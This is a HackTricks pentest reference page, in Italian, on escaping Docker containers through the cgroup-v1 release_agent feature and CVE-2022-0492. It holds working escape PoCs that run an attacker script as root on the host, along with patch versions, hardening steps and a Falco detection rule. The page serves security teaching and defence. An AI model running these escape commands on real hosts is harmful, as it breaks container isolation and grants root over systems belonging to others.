# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Per ulteriori dettagli, fare riferimento al** [**post originale del blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Questo è solo un riassunto:

---

## PoC classica (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Il PoC sfrutta la funzionalità **cgroup-v1** `release_agent`: quando l'ultimo task di un cgroup che ha `notify_on_release=1` termina, il kernel (negli **spazi dei nomi iniziali sull'host**) esegue il programma il cui pathname è memorizzato nel file scrivibile `release_agent`. Poiché tale esecuzione avviene con **privilegi di root completi sull'host**, ottenere accesso in scrittura al file è sufficiente per un'uscita dal container.

### Breve guida leggibile

1. **Preparare un nuovo cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # o –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Puntare `release_agent` a uno script controllato dall'attaccante sull'host**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Rilasciare il payload**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Attivare il notifier**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # aggiungiamo noi stessi e usciamo immediatamente
cat /output                                  # ora contiene i processi dell'host
```

---

## Vulnerabilità del kernel 2022 – CVE-2022-0492

Nel febbraio 2022 Yiqi Sun e Kevin Wang hanno scoperto che **il kernel non verificava *le* capacità quando un processo scriveva in `release_agent` in cgroup-v1** (funzione `cgroup_release_agent_write`).

Effettivamente **qualsiasi processo che poteva montare una gerarchia cgroup (ad es. tramite `unshare -UrC`) poteva scrivere un percorso arbitrario in `release_agent` senza `CAP_SYS_ADMIN` nello *spazio dei nomi* utente *iniziale***. Su un container Docker/Kubernetes in esecuzione come root e configurato di default, questo ha permesso:

* escalation dei privilegi a root sull'host; ↗
* uscita dal container senza che il container fosse privilegiato.

Il difetto è stato assegnato **CVE-2022-0492** (CVSS 7.8 / Alto) e corretto nelle seguenti versioni del kernel (e tutte le successive):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Commit di patch: `1e85af15da28 "cgroup: Fix permission checking"`.

### Exploit minimo all'interno di un container
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Se il kernel è vulnerabile, il binario busybox dal *host* viene eseguito con pieno accesso root.

### Indurimento e mitigazioni

* **Aggiorna il kernel** (≥ versioni superiori). Il patch ora richiede `CAP_SYS_ADMIN` nel *namespace* utente *iniziale* per scrivere su `release_agent`.
* **Preferisci cgroup-v2** – la gerarchia unificata **ha rimosso completamente la funzionalità `release_agent`**, eliminando questa classe di escape.
* **Disabilita i namespace utente non privilegiati** su host che non ne hanno bisogno:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Controllo di accesso obbligatorio**: le politiche AppArmor/SELinux che negano `mount`, `openat` su `/sys/fs/cgroup/**/release_agent`, o rimuovono `CAP_SYS_ADMIN`, fermano la tecnica anche su kernel vulnerabili.
* **Maschera di bind in sola lettura** per tutti i file `release_agent` (esempio di script Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Rilevamento in tempo reale

[`Falco`](https://falco.org/) include una regola integrata dalla v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
La regola si attiva su qualsiasi tentativo di scrittura a `*/release_agent` da un processo all'interno di un contenitore che detiene ancora `CAP_SYS_ADMIN`.

## Riferimenti

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – analisi dettagliata e script di mitigazione.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
